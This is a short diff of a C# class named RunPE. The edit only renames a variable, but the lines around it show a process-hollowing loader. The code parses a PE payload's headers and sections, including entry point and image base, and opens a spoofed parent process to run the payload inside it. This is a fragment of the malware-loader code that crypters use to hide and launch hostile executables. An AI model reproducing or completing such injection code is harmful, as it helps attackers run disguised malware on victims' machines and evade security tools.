@@ -25,13 +25,13 @@ public static class RunPE
 
 			try
 			{
-				int ntHeader = BitConverter.ToInt32(payload, 0x3c);
-				int sizeOfImage = BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x38);
-				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x3c);
-				int entryPoint = BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x10);
-				short numberOfSections = BitConverter.ToInt16(payload, ntHeader + 0x6);
-				short sizeOfOptionalHeader = BitConverter.ToInt16(payload, ntHeader + 0x14);
-				IntPtr imageBase = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x1c) : (IntPtr)BitConverter.ToInt64(payload, ntHeader + 0x18 + 0x18);
+				int ntHeaders = BitConverter.ToInt32(payload, 0x3c);
+				int sizeOfImage = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x38);
+				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x3c);
+				int entryPoint = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x10);
+				short numberOfSections = BitConverter.ToInt16(payload, ntHeaders + 0x6);
+				short sizeOfOptionalHeader = BitConverter.ToInt16(payload, ntHeaders + 0x14);
+				IntPtr imageBase = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x1c) : (IntPtr)BitConverter.ToInt64(payload, ntHeaders + 0x18 + 0x18);
 
 				IntPtr parentProcessHandle = OpenProcess(0x80, false, parentProcessId);
 				if (parentProcessHandle == IntPtr.Zero) throw new Exception();
@@ -72,7 +72,7 @@ public static class RunPE
 				for (short j = 0; j < numberOfSections; j++)
 				{
 					byte[] section = new byte[0x28];
-					Buffer.BlockCopy(payload, ntHeader + 0x18 + sizeOfOptionalHeader + j * 0x28, section, 0, 0x28);
+					Buffer.BlockCopy(payload, ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, section, 0, 0x28);
 
 					int virtualAddress = BitConverter.ToInt32(section, 0xc);
 					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
